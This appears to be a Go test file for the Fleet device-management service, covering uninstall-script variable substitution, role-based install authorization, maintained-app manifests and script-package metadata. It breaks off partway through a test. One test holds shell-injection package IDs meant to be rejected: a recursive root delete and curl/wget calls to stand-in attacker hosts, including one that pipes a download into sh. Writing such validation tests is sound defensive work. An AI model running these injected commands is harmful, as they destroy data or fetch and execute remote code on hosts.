package service

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	ma "github.com/fleetdm/fleet/v4/ee/maintained-apps"
	"github.com/fleetdm/fleet/v4/pkg/file"
	"github.com/fleetdm/fleet/v4/server/authz"
	"github.com/fleetdm/fleet/v4/server/config"
	"github.com/fleetdm/fleet/v4/server/contexts/viewer"
	"github.com/fleetdm/fleet/v4/server/datastore/s3"
	"github.com/fleetdm/fleet/v4/server/dev_mode"
	"github.com/fleetdm/fleet/v4/server/fleet"
	"github.com/fleetdm/fleet/v4/server/mock"
	redismock "github.com/fleetdm/fleet/v4/server/mock/redis"
	svcmock "github.com/fleetdm/fleet/v4/server/mock/service"
	"github.com/fleetdm/fleet/v4/server/ptr"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestPreProcessUninstallScript(t *testing.T) {
	t.Parallel()
	input := `
blah$PACKAGE_IDS
pkgids=$PACKAGE_ID
they are $PACKAGE_ID, right $MY_SECRET?
quotes for "$PACKAGE_ID"
blah${PACKAGE_ID}withConcat
quotes and braces for "${PACKAGE_ID}"
${PACKAGE_ID}`

	payload := fleet.UploadSoftwareInstallerPayload{
		Extension:       "exe",
		UninstallScript: input,
		PackageIDs:      []string{"com.foo"},
	}

	require.NoError(t, preProcessUninstallScript(&payload))
	expected := `
blah$PACKAGE_IDS
pkgids='com.foo'
they are 'com.foo', right $MY_SECRET?
quotes for 'com.foo'
blah'com.foo'withConcat
quotes and braces for 'com.foo'
'com.foo'`
	assert.Equal(t, expected, payload.UninstallScript)

	payload = fleet.UploadSoftwareInstallerPayload{
		Extension:       "pkg",
		UninstallScript: input,
		PackageIDs:      []string{"com.foo", "com.bar"},
	}
	require.NoError(t, preProcessUninstallScript(&payload))
	expected = `
blah$PACKAGE_IDS
pkgids=(
  'com.foo'
  'com.bar'
)
they are (
  'com.foo'
  'com.bar'
), right $MY_SECRET?
quotes for (
  'com.foo'
  'com.bar'
)
blah(
  'com.foo'
  'com.bar'
)withConcat
quotes and braces for (
  'com.foo'
  'com.bar'
)
(
  'com.foo'
  'com.bar'
)`
	assert.Equal(t, expected, payload.UninstallScript)

	payload.UninstallScript = "$UPGRADE_CODE"
	require.Error(t, preProcessUninstallScript(&payload))

	payload.UpgradeCode = "foo"
	require.NoError(t, preProcessUninstallScript(&payload))
	assert.Equal(t, `'foo'`, payload.UninstallScript)
}

func TestPreProcessUninstallScriptMaliciousInput(t *testing.T) {
	t.Parallel()

	maliciousIDs := []struct {
		name string
		id   string
	}{
		{"command substitution", "com.app$(id)"},
		{"backtick execution", "app`id`"},
		{"pipe injection", "app|rm -rf /"},
		{"semicolon injection", "app;curl attacker.com"},
		{"ampersand injection", "app&wget evil.com"},
		{"redirect injection", "app>file"},
		{"subshell injection", "com.app$(curl attacker.com/s|sh)"},
		{"single quote escape attempt", "app'$(id)'"},
		{"double quote injection", `app"$(id)"`},
		{"backslash injection", `app\nid`},
		{"newline injection", "app\nid"},
	}

	for _, tc := range maliciousIDs {
		t.Run(tc.name, func(t *testing.T) {
			payload := fleet.UploadSoftwareInstallerPayload{
				Extension:       "deb",
				UninstallScript: "$PACKAGE_ID",
				PackageIDs:      []string{tc.id},
			}
			require.Error(t, preProcessUninstallScript(&payload), "expected error for malicious input: %s", tc.id)
		})
	}

	// Verify valid identifiers still pass
	validIDs := []string{
		"com.example.app",
		"ruby",
		"org.mozilla.firefox",
		"{12345-ABCDE-67890}",
		"Microsoft.VisualStudioCode",
		"package/name",
		"my-app_v2.0+build1",
	}
	for _, id := range validIDs {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "deb",
			UninstallScript: "$PACKAGE_ID",
			PackageIDs:      []string{id},
		}
		require.NoError(t, preProcessUninstallScript(&payload), "expected no error for valid input: %s", id)
	}
}

func TestPreProcessUninstallScriptSkipsValidationWhenNoTemplateVars(t *testing.T) {
	t.Parallel()

	// Non-ASCII package ID that would fail the safeIdentifierRegex validation
	nonASCIIID := "CrossCore\u00ae Embedded Studio v3.0.2"

	t.Run("non-ASCII ID succeeds when script has no template vars", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "exe",
			UninstallScript: `$softwareName = "CrossCore Embedded Studio"`,
			PackageIDs:      []string{nonASCIIID},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		assert.Equal(t, `$softwareName = "CrossCore Embedded Studio"`, payload.UninstallScript)
	})

	t.Run("non-ASCII ID succeeds when script uses PACKAGE_ID", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "exe",
			UninstallScript: "$PACKAGE_ID",
			PackageIDs:      []string{nonASCIIID},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		assert.Contains(t, payload.UninstallScript, "'"+nonASCIIID+"'")
	})

	t.Run("non-ASCII upgrade code succeeds when script has no UPGRADE_CODE", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "msi",
			UninstallScript: "msiexec /x $PACKAGE_ID /quiet",
			PackageIDs:      []string{"valid-id"},
			UpgradeCode:     "code\u00ae",
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		assert.Contains(t, payload.UninstallScript, "'valid-id'")
	})

	t.Run("non-ASCII upgrade code succeeds when script uses UPGRADE_CODE", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "msi",
			UninstallScript: "msiexec /x $UPGRADE_CODE /quiet",
			PackageIDs:      []string{"valid-id"},
			UpgradeCode:     "code\u00ae",
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		assert.Contains(t, payload.UninstallScript, "'code\u00ae'")
	})

	t.Run("dmg skips validation entirely", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "dmg",
			UninstallScript: "$PACKAGE_ID\n\necho 'foo'",
			PackageIDs:      []string{nonASCIIID},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		require.Equal(t, "$PACKAGE_ID\n\necho 'foo'", payload.UninstallScript) // confirm no variable substitution
	})

	t.Run("zip skips validation entirely", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "zip",
			UninstallScript: "$PACKAGE_ID\n\necho 'foo'",
			PackageIDs:      []string{nonASCIIID},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		require.Equal(t, "$PACKAGE_ID\n\necho 'foo'", payload.UninstallScript) // confirm no variable substitution
	})

	t.Run("empty PackageIDs skips processing", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "exe",
			UninstallScript: "$PACKAGE_ID",
			PackageIDs:      []string{},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		require.Equal(t, "$PACKAGE_ID", payload.UninstallScript) // confirm no variable substitution
	})
}

func TestInstallUninstallAuth(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
		return &fleet.AppConfig{
			ServerSettings: fleet.ServerSettings{ScriptsDisabled: true},
		}, nil
	}
	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return &fleet.Host{
			OrbitNodeKey: ptr.String("orbit_key"),
			Platform:     "darwin",
			TeamID:       ptr.Uint(1),
		}, nil
	}
	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint,
		withScriptContents bool,
	) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			Name:     "installer.pkg",
			Platform: "darwin",
			TeamID:   ptr.Uint(1),
		}, nil
	}
	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID uint, installerID uint) (*fleet.HostLastInstallData, error) {
		return nil, nil
	}
	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
		return nil
	}
	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string,
		error,
	) {
		return "request_id", nil
	}
	ds.GetAnyScriptContentsFunc = func(ctx context.Context, id uint) ([]byte, error) {
		return []byte("script"), nil
	}
	ds.InsertSoftwareUninstallRequestFunc = func(ctx context.Context, executionID string, hostID uint, softwareInstallerID uint, selfService bool) error {
		return nil
	}

	ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID, hostID uint) (bool, error) {
		return true, nil
	}

	testCases := []struct {
		name       string
		user       *fleet.User
		shouldFail bool
	}{
		{
			"global admin",
			&fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)},
			false,
		},
		{
			"global maintainer",
			&fleet.User{GlobalRole: ptr.String(fleet.RoleMaintainer)},
			false,
		},
		{
			"global observer",
			&fleet.User{GlobalRole: ptr.String(fleet.RoleObserver)},
			true,
		},
		{
			"team admin",
			&fleet.User{Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleAdmin}}},
			false,
		},
		{
			"team maintainer",
			&fleet.User{Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleMaintainer}}},
			false,
		},
		{
			"team observer",
			&fleet.User{Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleObserver}}},
			true,
		},
	}
	for _, tt := range testCases {
		t.Run(tt.name, func(t *testing.T) {
			ctx := viewer.NewContext(context.Background(), viewer.Viewer{User: tt.user})
			checkAuthErr(t, tt.shouldFail, svc.InstallSoftwareTitle(ctx, 1, 10))
			checkAuthErr(t, tt.shouldFail, svc.UninstallSoftwareTitle(ctx, 1, 10))
		})
	}
}

func TestUninstallSoftwareTitle(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	host := &fleet.Host{
		OrbitNodeKey: ptr.String("orbit_key"),
		Platform:     "darwin",
		TeamID:       ptr.Uint(1),
	}

	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return host, nil
	}

	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
		return &fleet.AppConfig{
			ServerSettings: fleet.ServerSettings{
				ScriptsDisabled: true,
			},
		}, nil
	}

	host.ScriptsEnabled = ptr.Bool(false)
	require.ErrorContains(t, svc.UninstallSoftwareTitle(context.Background(), 1, 10), fleet.RunScriptsOrbitDisabledErrMsg)
}

func TestInstallSoftwareTitleAllowsPersonallyEnrolledDevices(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	// Personally-enrolled iOS/iPadOS hosts must reach the install lookup; the
	// BYOD gate that previously short-circuited them is removed in #43998.
	// Returning NotFound from the in-house and VPP app lookups makes the code
	// surface the standard "title not available" error — proving we got past
	// the old gate without entangling this test in the install flow.
	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		return nil, nil
	}
	ds.GetVPPAppByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.VPPApp, error) {
		return nil, &notFoundError{}
	}

	ctx := viewer.NewContext(context.Background(), viewer.Viewer{User: &fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)}})

	host := &fleet.Host{
		UUID:         "personal-ios",
		OrbitNodeKey: ptr.String("orbit_key"),
		Platform:     "ios",
		TeamID:       ptr.Uint(1),
		MDM: fleet.MDMHostData{
			EnrollmentStatus: ptr.String(string(fleet.MDMEnrollStatusPersonal)),
		},
	}

	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return host, nil
	}

	err := svc.InstallSoftwareTitle(ctx, 1, 10)
	require.Error(t, err)
	require.NotContains(t, err.Error(), fleet.InstallSoftwarePersonalAppleDeviceErrMsg,
		"BYOD gate must no longer block install for personally-enrolled iOS/iPadOS hosts")
	require.ErrorContains(t, err, "Software title is not available for install",
		"control flow must reach the standard not-found path")
}

func TestSoftwareInstallerPayloadFromSlug(t *testing.T) {
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	installerBytes := []byte("1password")
	h := sha256.New()
	_, err := h.Write(installerBytes)
	require.NoError(t, err)
	onePasswordSHA := hex.EncodeToString(h.Sum(nil))

	manifestServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		slug := strings.TrimPrefix(strings.TrimSuffix(r.URL.Path, ".json"), "/")

		var versions []*ma.FMAManifestApp
		versions = append(versions, &ma.FMAManifestApp{
			Version: "1",
			Queries: ma.FMAQueries{
				Exists: "SELECT 1 FROM osquery_info;",
			},
			InstallerURL:       fmt.Sprintf("/installer-%s.zip", slug),
			InstallScriptRef:   "installscript",
			UninstallScriptRef: "uninstallscript",
			DefaultCategories:  []string{"Productivity"},
		})

		manifest := ma.FMAManifestFile{
			Versions: versions,
			Refs: map[string]string{
				"installscript":   "echo 'installing'",
				"uninstallscript": "echo 'uninstalling'",
			},
		}

		switch slug {
		case "":
			w.WriteHeader(http.StatusNotFound)
			return

		case "1password/darwin":
			manifest.Versions[0].SHA256 = onePasswordSHA

		case "google-chrome/darwin":
			manifest.Versions[0].SHA256 = "no_check"
		}

		err := json.NewEncoder(w).Encode(manifest)
		require.NoError(t, err)
	}))
	t.Cleanup(manifestServer.Close)
	dev_mode.SetOverride("FLEET_DEV_MAINTAINED_APPS_BASE_URL", manifestServer.URL, t)

	ds.GetMaintainedAppBySlugFunc = func(ctx context.Context, slug string, teamID *uint) (*fleet.MaintainedApp, error) {
		return &fleet.MaintainedApp{
			ID:               1,
			Name:             "1Password",
			Platform:         "darwin",
			UniqueIdentifier: "com.1password.1password",
			Slug:             "1password/darwin",
		}, nil
	}
	payload := fleet.SoftwareInstallerPayload{Slug: ptr.String("1password/darwin")}
	err = svc.softwareInstallerPayloadFromSlug(context.Background(), &payload, nil)
	require.NoError(t, err)
	assert.NotEmpty(t, payload.URL)
	assert.Equal(t, onePasswordSHA, payload.SHA256)
	assert.NotEmpty(t, payload.InstallScript)
	assert.NotEmpty(t, payload.UninstallScript)
	assert.True(t, payload.FleetMaintained)

	ds.GetMaintainedAppBySlugFunc = func(ctx context.Context, slug string, teamID *uint) (*fleet.MaintainedApp, error) {
		return &fleet.MaintainedApp{
			ID:               1,
			Name:             "Google Chrome",
			Platform:         "darwin",
			UniqueIdentifier: "com.google.Chrome",
			Slug:             "google-chrome/darwin",
		}, nil
	}
	payload = fleet.SoftwareInstallerPayload{Slug: ptr.String("google-chrome/darwin")}
	err = svc.softwareInstallerPayloadFromSlug(context.Background(), &payload, nil)
	require.NoError(t, err)
	assert.NotEmpty(t, payload.URL)
	assert.Empty(t, payload.SHA256)
	assert.NotEmpty(t, payload.InstallScript)
	assert.NotEmpty(t, payload.UninstallScript)
	assert.True(t, payload.FleetMaintained)

	payload = fleet.SoftwareInstallerPayload{URL: "https://fleetdm.com"}
	err = svc.softwareInstallerPayloadFromSlug(context.Background(), &payload, nil)
	require.NoError(t, err)
	assert.Nil(t, payload.Slug)
	assert.Equal(t, "https://fleetdm.com", payload.URL)
	assert.Empty(t, payload.SHA256)
	assert.Empty(t, payload.InstallScript)
	assert.Empty(t, payload.UninstallScript)
	assert.False(t, payload.FleetMaintained)

	ds.GetMaintainedAppBySlugFunc = func(ctx context.Context, slug string, teamID *uint) (*fleet.MaintainedApp, error) {
		return &fleet.MaintainedApp{
			ID:               1,
			Name:             "1Password",
			Platform:         "darwin",
			UniqueIdentifier: "com.1password.1password",
			Slug:             "1password/darwin",
			TitleID:          new(uint(1)),
		}, nil
	}

	ds.GetFleetMaintainedVersionsByTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, byVersion bool) ([]fleet.FleetMaintainedVersion, error) {
		return []fleet.FleetMaintainedVersion{{ID: 1, Version: "26.0.0"}}, nil
	}

	ds.GetCachedFMAInstallerMetadataFunc = func(ctx context.Context, teamID *uint, fmaID uint, version string) (*fleet.MaintainedApp, error) {
		return &fleet.MaintainedApp{
			ID:               1,
			Name:             "1Password",
			Platform:         "darwin",
			UniqueIdentifier: "com.1password.1password",
			Slug:             "1password/darwin",
		}, nil
	}

	versionPinValidationTests := []struct {
		name    string
		version string
		wantErr string
	}{
		{
			name:    "valid",
			version: "^26",
		},
		{
			name:    "no version",
			version: "^",
			wantErr: "no version number provided",
		},
		{
			name:    "invalid version",
			version: "^26.0",
			wantErr: errNonMajorVersion.Error(),
		},
	}

	for _, vt := range versionPinValidationTests {
		t.Run(vt.name, func(t *testing.T) {
			payload := fleet.SoftwareInstallerPayload{Slug: ptr.String("1password/darwin"), RollbackVersion: vt.version}
			err = svc.softwareInstallerPayloadFromSlug(context.Background(), &payload, nil)
			if vt.wantErr != "" {
				require.Error(t, err)
				require.ErrorContains(t, err, vt.wantErr)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestGetInHouseAppManifest(t *testing.T) {
	ds := new(mock.Store)
	svc := newTestService(t, ds)
	ctx := context.Background()

	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
		return &fleet.AppConfig{ServerSettings: fleet.ServerSettings{ServerURL: "https://example.com"}}, nil
	}

	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		if titleID == 1 {
			return &fleet.SoftwareInstaller{
				BundleIdentifier: "com.foo.bar",
				Version:          "1.2.3",
				SoftwareTitle:    "test in-house app",
				StorageID:        "123storageid",
			}, nil
		}

		return nil, &notFoundError{}
	}

	expected := `
<plist version="1.0">
  <dict>
    <key>items</key>
    <array>
      <dict>
        <key>assets</key>
        <array>
          <dict>
            <key>kind</key>
            <string>software-package</string>
            <key>url</key>
            <string>https://example.com/api/latest/fleet/software/titles/1/in_house_app?fleet_id=0</string>
          </dict>
          <dict>
            <key>kind</key>
            <string>display-image</string>
            <key>needs-shine</key>
            <true/>
            <key>url</key>
            <string/>
          </dict>
        </array>
        <key>metadata</key>
        <dict>
          <key>bundle-identifier</key>
          <string>com.foo.bar</string>
          <key>bundle-version</key>
          <string>1.2.3</string>
          <key>kind</key>
          <string>software</string>
          <key>title</key>
          <string>test in-house app</string>
        </dict>
      </dict>
    </array>
  </dict>
</plist>`

	manifest, err := svc.GetInHouseAppManifest(ctx, 1, nil)
	require.NoError(t, err)

	assert.Equal(t, expected, string(manifest))

	_, err = svc.GetInHouseAppManifest(ctx, 2, nil)
	assert.Error(t, err)
	assert.True(t, fleet.IsNotFound(err))

	// Set up a new S3 store to test CloudFront signing
	signer, _ := rsa.GenerateKey(rand.Reader, 2048)
	svc.config.S3.SoftwareInstallersCloudFrontSigner = signer
	signerURL := "https://example.cloudfront.net"

	s3Config := config.S3Config{
		SoftwareInstallersCloudFrontURL:                   signerURL,
		SoftwareInstallersCloudFrontURLSigningPublicKeyID: "ABC123XYZ",
		SoftwareInstallersCloudFrontSigner:                signer,
	}
	s3Store, err := s3.NewTestSoftwareInstallerStore(s3Config)
	require.NoError(t, err)
	svc.softwareInstallStore = s3Store

	manifest, err = svc.GetInHouseAppManifest(ctx, 1, nil)
	require.NoError(t, err)
	require.Contains(t, string(manifest), signerURL)
}

func checkAuthErr(t *testing.T, shouldFail bool, err error) {
	t.Helper()
	if shouldFail {
		require.Error(t, err)
		var forbiddenError *authz.Forbidden
		require.ErrorAs(t, err, &forbiddenError)
	} else {
		require.NoError(t, err)
	}
}

func newTestService(t *testing.T, ds fleet.Datastore) *Service {
	t.Helper()
	authorizer, err := authz.NewAuthorizer()
	require.NoError(t, err)
	svc := &Service{
		authz: authorizer,
		ds:    ds,
	}
	return svc
}

func newTestServiceWithMock(t *testing.T, ds fleet.Datastore) (*Service, *svcmock.Service) {
	t.Helper()
	authorizer, err := authz.NewAuthorizer()
	require.NoError(t, err)
	baseSvc := new(svcmock.Service)
	svc := &Service{
		Service: baseSvc,
		authz:   authorizer,
		ds:      ds,
	}
	return svc, baseSvc
}

func TestAddScriptPackageMetadata(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	svc := newTestService(t, nil)

	t.Run("valid shell script", func(t *testing.T) {
		scriptContents := "#!/bin/bash\necho 'Installing software'\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "install-app.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.NoError(t, err)
		require.Equal(t, "install-app", payload.Title)
		require.Equal(t, "", payload.Version)
		require.Equal(t, scriptContents, payload.InstallScript)
		require.Equal(t, "linux", payload.Platform)
		require.Equal(t, "sh_packages", payload.Source)
		require.Empty(t, payload.BundleIdentifier)
		require.Empty(t, payload.PackageIDs)
		require.NotEmpty(t, payload.StorageID)
		require.Equal(t, "sh", payload.Extension)
	})

	t.Run("valid powershell script", func(t *testing.T) {
		scriptContents := "Write-Host 'Installing software'\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.ps1")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "install-app.ps1",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "ps1")
		require.NoError(t, err)
		require.Equal(t, "install-app", payload.Title)
		require.Equal(t, "", payload.Version)
		require.Equal(t, scriptContents, payload.InstallScript)
		require.Equal(t, "windows", payload.Platform)
		require.Equal(t, "ps1_packages", payload.Source)
		require.Empty(t, payload.BundleIdentifier)
		require.Empty(t, payload.PackageIDs)
		require.NotEmpty(t, payload.StorageID)
	})

	t.Run("invalid shebang", func(t *testing.T) {
		scriptContents := "#!/usr/bin/python\nprint('hello')\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "test.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.Error(t, err)
		require.Contains(t, err.Error(), "Script validation failed")
		require.Contains(t, err.Error(), "Interpreter not supported")
	})

	t.Run("empty script", func(t *testing.T) {
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "test.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.Error(t, err)
		require.Contains(t, err.Error(), "must not be empty")
	})

	t.Run("custom title preserved", func(t *testing.T) {
		scriptContents := "#!/bin/bash\necho 'test'\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "test.sh",
			Title:         "My Custom Title",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.NoError(t, err)
		require.Equal(t, "My Custom Title", payload.Title)
	})

	t.Run("file contents preserved verbatim", func(t *testing.T) {
		scriptContents := "#!/bin/bash\necho \"Test's 'quotes'\"\necho $VAR\n\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "test.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.NoError(t, err)
		require.Equal(t, scriptContents, payload.InstallScript)
	})
}

func TestAddScriptPackageMetadataLargeScript(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	svc := newTestService(t, nil)

	t.Run("large shell script within saved limit", func(t *testing.T) {
		t.Parallel()
		// Generate a script larger than UnsavedScriptMaxRuneLen (10K) but within
		// SavedScriptMaxRuneLen (500K). Script packages are persisted via GitOps
		// and should use the saved script limit.
		scriptContents := "#!/bin/bash\n" + strings.Repeat("echo 'line'\n", 1000)
		require.Greater(t, len(scriptContents), fleet.UnsavedScriptMaxRuneLen)
		require.Less(t, len(scriptContents), fleet.SavedScriptMaxRuneLen)

		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "large-install.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.NoError(t, err)
		require.Equal(t, scriptContents, payload.InstallScript)
	})

	t.Run("large powershell script within saved limit", func(t *testing.T) {
		t.Parallel()
		scriptContents := strings.Repeat("Write-Host 'line'\r\n", 1000)
		require.Greater(t, len(scriptContents), fleet.UnsavedScriptMaxRuneLen)
		require.Less(t, len(scriptContents), fleet.SavedScriptMaxRuneLen)

		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.ps1")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "large-install.ps1",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "ps1")
		require.NoError(t, err)
		require.Equal(t, scriptContents, payload.InstallScript)
	})
}

// TestInstallShScriptOnDarwin tests that .sh scripts (stored as platform='linux')
// can be installed on darwin hosts.
func TestInstallShScriptOnDarwin(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	// Mock darwin host
	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return &fleet.Host{
			ID:           1,
			OrbitNodeKey: ptr.String("orbit_key"),
			Platform:     "darwin",
			TeamID:       ptr.Uint(1),
		}, nil
	}

	// Not an in-house app
	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		return nil, nil
	}

	// Mock .sh installer metadata (platform='linux' as .sh files are stored)
	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, withScriptContents bool) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			InstallerID: 10,
			Name:        "script.sh",
			Extension:   "sh",
			Platform:    "linux", // .sh stored as linux
			TeamID:      ptr.Uint(1),
			TitleID:     ptr.Uint(100),
			SelfService: false,
		}, nil
	}

	// Label scoping check passes
	ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID, hostID uint) (bool, error) {
		return true, nil
	}

	// No pending install
	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID, installerID uint) (*fleet.HostLastInstallData, error) {
		return nil, nil
	}

	// Reset retry attempts (no-op for test)
	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
		return nil
	}

	// Capture that install request was inserted
	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string, error) {
		return "install-uuid", nil
	}

	// Create admin user context
	ctx := viewer.NewContext(context.Background(), viewer.Viewer{
		User: &fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)},
	})

	// Install .sh on darwin should succeed (not return BadRequestError)
	err := svc.InstallSoftwareTitle(ctx, 1, 100)
	require.NoError(t, err, ".sh install on darwin should succeed")
	require.True(t, ds.InsertSoftwareInstallRequestFuncInvoked, "install request should be created")
}

// TestInstallShScriptOnWindowsFails tests that .sh scripts can't be installed on Windows hosts.
func TestInstallShScriptOnWindowsFails(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	// Mock Windows host
	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return &fleet.Host{
			ID:           1,
			OrbitNodeKey: ptr.String("orbit_key"),
			Platform:     "windows",
			TeamID:       ptr.Uint(1),
		}, nil
	}

	// Not an in-house app
	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		return nil, nil
	}

	// Mock .sh installer metadata
